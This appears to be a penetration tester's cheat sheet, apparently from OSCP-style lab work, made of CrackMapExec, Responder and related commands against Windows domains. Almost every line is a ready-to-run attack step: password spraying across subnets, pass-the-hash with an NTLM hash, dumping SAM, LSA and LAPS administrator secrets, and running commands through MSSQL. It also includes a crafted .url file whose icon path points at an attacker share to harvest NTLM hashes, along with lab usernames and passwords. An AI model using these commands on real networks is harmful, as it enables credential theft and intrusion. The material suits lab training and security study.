
```
crackmapexec ldap TARGET -u fmcsorley -p CrabSharkJellyfish192 --kdcHost TARGET -M laps
```
To dump administrators password


```
crackmapexec smb TARGET -u ./users.txt -p ./passwords.txt --continue-on-success
```



```
crackmapexec smb TARGET/24 -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -u user -p pass --continue-on-success --local-auth
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success
```

```
crackmapexec winrm TARGET/24 -d medtech.com -u user -p pass --continue-on-success
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -p pass --continue-on-success --shares
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success --sam
```

```
crackmapexec smb TARGET/24 -d medtech.com -u user -H f26c0186c8ffcceb01fd2d7549e7ac1f --continue-on-success --lsa
```





**SMB:**
```
responder -I tun0 -v
```
only works if message signing is enabled but not required 
```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\ATTACKER\%USERNAME%.icon
IconIndex=1
```
OffSec.url

```
crackmapexec mssql $IP -d oscp.exam -u username -p passowrd
```

```
crackmapexec mssql $IP -d oscp.exam -u username -p passowrd -x 'command to run'
```

```
crackmapexec winrm TARGET -u fmcsorely -p CrabSharkJellyfish192
```

```
crackmapexec smb TARGET -u fmcsorley -p CrabSharkJellyfish192 --shares
```

```
crackmapexec smb TARGET -u usernames.txt -p passwords.txt --continue-on-success
```

```
crackmapexec smb TARGET -u john -p "dqsTwTpZPn#nL" --shares
```

```
crackmapexec smb TARGET -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

```
crackmapexec smb TARGET -u dave -p 'Flowers1' -d corp.com
```

```
crackmapexec smb TARGET -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success
```

